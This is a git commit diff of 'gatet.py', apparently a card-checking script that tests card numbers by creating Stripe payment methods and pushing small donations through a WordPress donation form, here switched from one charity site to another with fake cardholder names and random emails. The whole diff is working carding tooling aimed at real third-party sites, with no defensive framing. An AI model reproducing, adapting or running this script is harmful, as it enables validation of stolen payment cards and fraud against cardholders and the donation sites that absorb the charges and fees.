1e5bccde9566bc54acf8e7a224991fc9cca155c9
Rodamuser08 <rodamuser08@gmail.com>
2025-07-02 09:50:02 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -33,19 +33,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fa84e0dccbf%3B+stripe-js-v3%2Fa84e0dccbf%3B+card-element&key=pk_live_51KyC7aCLoq7JcRThGLcWCXdUAI14qbuWIkoCuYCOLnvjKy257yEbRGkK3F99aAeu7yJJeQuxwCb2FGw3OFv8VVDU00W2Me8urc'
+	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ffb705f34aa%3B+stripe-js-v3%2Ffb705f34aa%3B+card-element&referrer=https%3A%2F%2Filfmedia.com&time_on_page=58989&key=pk_live_51Htc78EWFvJhVVegTITTsLS0bGqqbu0gOSJdWifr2kxWX8mkJNNZmcOuRDWBk6ZYNWB2u92PatJXwwm4ZUi8l7qt00vUozeEge'
 	
 	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'ontarioheroes.ca',
-	    'accept': '*/*',
+	    'authority': 'ilfmedia.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://ontarioheroes.ca',
-	    'referer': 'https://ontarioheroes.ca/be-a-supporter/',
+	    'origin': 'https://ilfmedia.com',
+	    'referer': 'https://ilfmedia.com/webb-donate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,26 +56,20 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1751362075787',
-	}
-	
 	data = {
-	    'data': f'item_51__fluent_sf=&__fluent_form_embded_post_id=125693&_fluentform_51_fluentformnonce=3aa4d6bcd8&_wp_http_referer=%2Fbe-a-supporter%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&input_text_2=&email=&input_text=&custom-payment-amount=1.00&payment_method=stripe&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '51',
+	    'action': 'wp_full_stripe_inline_donation_charge',
+	    'wpfs-form-name': 'Webbs_Live_Stream',
+	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount': 'other',
+	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-donation-frequency': 'one-time',
+	    'wpfs-card-holder-email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	    'wpfs-card-holder-name': 'Rodam User',
+	    'wpfs-stripe-payment-method-id': pm,
 	}
 	
-	response = session.post(
-	    'https://ontarioheroes.ca/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
+	response = session.post('https://ilfmedia.com/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
-	try:
-		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
-	except:
-		result = response.text
+	result = re.search('"message":"(.*?)"', response.text).group(1)
 		
 	return (result)
